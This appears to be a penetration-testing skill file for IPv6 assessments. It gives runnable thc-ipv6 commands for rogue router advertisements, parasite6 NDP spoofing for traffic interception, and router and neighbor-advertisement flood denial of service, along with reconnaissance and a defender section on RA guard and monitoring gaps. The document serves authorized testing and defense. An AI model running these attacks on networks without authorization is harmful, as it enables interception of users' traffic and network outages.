---
name: ipv6-attacks
description: Use when testing IPv6 on authorized engagements, especially
  dual-stack networks where IPv6 is enabled but unmonitored. Covers IPv6
  reconnaissance with alive6, SLAAC and NDP behavior, rogue router
  advertisement attacks with fake_router6, NDP spoofing with parasite6,
  denial of service via malformed advertisements, and checking whether
  security controls apply equally to v6. Use when the target runs IPv6 or
  when you suspect the firewall, IDS, or logging ignores IPv6 traffic.
version: 1.0.0
domain: network
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [nmap-methodology, recon-active]
tools:
  - name: thc-ipv6
    version: "3.8"
  - name: nmap
    version: "7.98"
  - name: Wireshark
    version: "4.4"
---

Most networks are dual-stack today: IPv6 runs alongside IPv4, often with
less monitoring, weaker firewall rules, and no IDS coverage. Attackers
know this. IPv6 autoconfiguration (SLAAC) trusts router advertisements
from anyone on the link, which enables rogue router and NDP spoofing
attacks straight out of the thc-ipv6 toolkit. This skill covers authorized
IPv6 assessment: discovering v6 hosts, understanding NDP and SLAAC, running
rogue RA and neighbor spoofing attacks in a lab or scoped segment, and
auditing whether defenses cover IPv6 at all. The denial of service demos
are lab only. All testing targets systems you have written permission to
test.

## Quick Workflow

1. Check whether the test segment and your attack box have IPv6 enabled.
2. Discover live IPv6 hosts with multicast ping and alive6.
3. Map the NDP and SLAAC behavior: who advertises routers, what prefixes
   are announced.
4. Run a rogue router advertisement to prove SLAAC trust (scoped, brief).
5. Demonstrate NDP spoofing for MITM positioning with parasite6.
6. Audit firewall, IDS, and logging for IPv6 blind spots.
7. Restore normal router advertisements and verify recovery.

## 1. Confirm IPv6 is alive on the segment

Many testers assume IPv4 only and miss the whole v6 surface. Check both
your box and the wire.

```bash
# Your IPv6 addresses (link-local fe80:: and any global addresses)
ip -6 addr show dev eth0 | grep inet6

# Is there a router advertising on the link? Listen briefly
sudo timeout 20 tshark -i eth0 -Y icmpv6.type==134 -T fields \
  -e ipv6.src -e icmpv6.nd.ra.prefix 2>/dev/null | head -10
# icmpv6 type 134 = Router Advertisement; the prefix line shows the network
```

```bash
# Multicast ping to all nodes: every IPv6 host should answer
ping6 -c2 -I eth0 ff02::1 | head -20

# thc-ipv6 discovery: enumerate live hosts properly
sudo alive6 eth0 | tee /tmp/alive6.txt
```

`alive6` finds hosts that ignore multicast ping. Save its output; those
addresses are your target list for scanning.

```bash
# nmap IPv6 host discovery and port scan on found hosts
sudo nmap -6 -sn --send-ip ff02::1 -e eth0 2>/dev/null | grep -E 'Nmap scan|MAC'
sudo nmap -6 -F -T4 2001:db8::10 -oN /tmp/v6-ports.txt
```

Note: nmap needs `-6` for everything IPv6, and link-local addresses need
the interface suffix (`fe80::1%eth0`).

## 2. Understand NDP and SLAAC on the target

IPv6 replaced ARP with NDP (Neighbor Discovery Protocol) and DHCP with
SLAAC (Stateless Address Autoconfiguration) plus optional DHCPv6. The
trust problem: hosts accept Router Advertisements from any link-local
sender.

```bash
# Capture RAs and Router Solicitations for two minutes
sudo timeout 120 tshark -i eth0 -Y "icmpv6.type==133 or icmpv6.type==134" \
  -w /tmp/ndp.pcap
tshark -r /tmp/ndp.pcap -T fields -e ipv6.src -e icmpv6.nd.ra.prefix \
  -e icmpv6.nd.ra.lifetime | sort -u

# Watch neighbor solicitation/advertisement pairs (the v6 ARP)
sudo timeout 60 tshark -i eth0 -Y "icmpv6.type==135 or icmpv6.type==136" \
  -T fields -e ipv6.src -e icmpv6.nd.ns.target_address 2>/dev/null | head -20
```

Record: the legitimate router's link-local address, the advertised
prefix, the RA lifetime, and the managed/other-config flags (M and O
flags tell hosts whether to use DHCPv6).

## 3. Rogue router advertisement (fake_router6)

A rogue RA tells victims you are a router, so they add you as a default
gateway and send traffic your way. This is the IPv6 equivalent of ARP
spoofing plus DHCP spoofing in one packet. Run it briefly and only in
scope.

```bash
# Announce yourself as a router for the observed prefix (example values)
sudo fake_router6 eth0 2001:db8:1::/64

# With a limited lifetime so victims recover fast when you stop
# (fake_router6 uses a default lifetime; keep the run under 2 minutes)
timeout 90 sudo fake_router6 eth0 2001:db8:1::/64
```

While it runs, verify from a lab victim that its default route changed:

```bash
# On the victim (lab): the attacker's link-local should appear as gateway
ip -6 route show default
```

Then prove traffic interception the same way as IPv4 MITM: enable
forwarding (`net.ipv6.conf.all.forwarding=1`), capture, and look for
cleartext protocols. Stop the tool with Ctrl-C; victims fall back to the
real router when your RAs expire.

```bash
# Enable IPv6 forwarding before intercepting
echo 1 | sudo tee /proc/sys/net/ipv6/conf/all/forwarding
```

## 4. NDP spoofing with parasite6

`parasite6` answers neighbor solicitations for a target address, placing
you in the middle for specific hosts without touching router config. It is
quieter than a rogue RA.

```bash
# Spoof the gateway for one victim (lab or explicitly scoped)
sudo parasite6 -l eth0 2001:db8:1::1 2001:db8:1::50
# Args: interface, address to impersonate, victim to poison (omit victim for all)
```

Monitor with tshark filtered on neighbor advertisements from your MAC to
confirm the poison, then capture victim traffic as in the rogue RA case.
Restore by stopping parasite6; NDP entries expire and correct themselves,
but verify the victim's neighbor table recovers.

## 5. Denial of service demos (lab only)

Malformed RAs can break IPv6 on a segment. These are disruptive; run them
only in an isolated lab, never on a client network.

```bash
# Flood bogus router advertisements (lab only)
sudo flood_router6 eth0

# Flood neighbor advertisements to exhaust neighbor caches (lab only)
sudo flood_advertise6 eth0
```

The finding for a client report is not the flood itself but the absence of
RA guard on the switch: with RA guard, the switch drops RAs from
untrusted ports and these attacks fail. Test for RA guard presence in the
lab, report the control gap on the client network.

## 6. Audit the IPv6 blind spot

The highest value IPv6 work on most engagements is not exploitation but
showing the defenders they cannot see v6 at all.

```bash
# Does the firewall treat v6 like v4? Compare open ports both ways
sudo nmap -F -T4 192.0.2.10 -oG /tmp/v4.gnmap >/dev/null
sudo nmap -6 -F -T4 2001:db8::10 -oG /tmp/v6.gnmap >/dev/null
grep open /tmp/v4.gnmap | head; echo ---; grep open /tmp/v6.gnmap | head

# Check ip6tables / nftables for v6 rules on a host you administer
sudo ip6tables -L -n | head -20
sudo nft list ruleset 2>/dev/null | grep -i "ip6\|inet" | head -20

# Is anything logging v6? Look for v6 in firewall and IDS logs
sudo grep -i "2001:\|fe80:" /var/log/ufw.log 2>/dev/null | head -5
```

Common gaps: no ip6tables rules at all, IDS without v6 decoders, SIEM
parsers that drop v6 addresses, and VPNs that tunnel v4 but leak v6
around the tunnel. Each gap is a finding with the exact command that
exposed it.

## Edge cases

- The segment has no IPv6. `ip -6 addr` shows only link-local and no RAs
  arrive; there is nothing to attack, but note whether v6 is disabled by
  policy or just absent.
- The switch enforces RA guard. Rogue RAs die at the port; verify the
  control works and report it as effective.
- SEND (Secure Neighbor Discovery) is deployed. Cryptographically signed
  NDP defeats spoofing; this is rare outside high security networks, and
  finding it is a positive note.
- Targets use privacy extensions (temporary addresses). Host tracking by
  address gets harder; correlate by MAC-derived interface identifiers or
  DHCPv6 DUIDs instead.
- thc-ipv6 tools need raw sockets. Run as root, and on some distros
  install the package as `thc-ipv6` (Debian/Ubuntu) rather than building
  from source.
- nmap IPv6 scans are slow. Use `-F` or a targeted port list first; full
  v6 port sweeps across large ranges take far longer than v4.

## Escalation

- Rogue RA is blocked by RA guard. Note the control, then check whether
  the guard covers all switch ports or only user ports; misconfigured
  trunk ports are the usual hole.
- You need v6 MITM but RA is guarded. Fall back to parasite6 NDP
  spoofing against specific victims, which RA guard does not stop.
- The client has no IPv6 at all. Recommend they keep it that way
  deliberately (disable via sysctl and GPO) rather than by accident, so
  it does not silently appear later.
- DHCPv6 is in use (M flag set). Test DHCPv6 spoofing only in the lab;
  on client networks, note the M flag and recommend DHCPv6 guard or
  snooping.

## Detection and defender view

Defenders see IPv6 attacks as unexpected ICMPv6 type 134 from non-router
ports, neighbor advertisement storms, and new default gateways appearing
on hosts. Switches with RA guard and DHCPv6 snooping drop the attack
traffic outright; NDR tools with v6 decoders flag the anomalies. The
durable fixes: enable RA guard on all access ports, deploy SEND where the
risk justifies it, write and test ip6tables/nftables rules with the same
care as v4 rules, make sure the IDS and SIEM parse IPv6, and decide
explicitly whether IPv6 is on or off everywhere instead of letting it
drift. Audit for v6 the same way you audit v4, on a schedule.

## Key references

- MITRE ATT&CK T1557 (Adversary-in-the-Middle): rogue RA and NDP
  spoofing.
- MITRE ATT&CK T1046 (Network Service Discovery): alive6 and v6 scans.
- CWE-306 (Missing Authentication for Critical Function): unauthenticated
  router advertisements.
- IETF RFC 4861 (Neighbor Discovery), RFC 4862 (SLAAC), RFC 6104 (Rogue
  RA problem statement).
- thc-ipv6 toolkit: https://github.com/vanhauser-thc/thc-ipv6
- nmap IPv6 scanning: https://nmap.org/book/man.html (section on -6)

## See also

- `ipv6-deep-dive`: Use it instead for the shorter assessment, focused on discovery, extension-header abuse, and dual-stack parity.
